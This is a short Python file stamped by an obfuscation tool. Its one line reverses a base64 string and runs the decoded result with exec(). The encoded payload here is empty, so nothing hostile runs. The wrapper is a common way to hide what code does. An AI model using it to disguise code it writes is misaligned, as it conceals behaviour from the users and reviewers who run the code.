# Obfuscated By Axak 
# https://www.github.com/PaNdAxAk 
# Time : Thu Jun 16 00:26:29 2022 

_ = lambda __ : __import__('base64').b64decode(__[::-1]);exec((_)(b'='))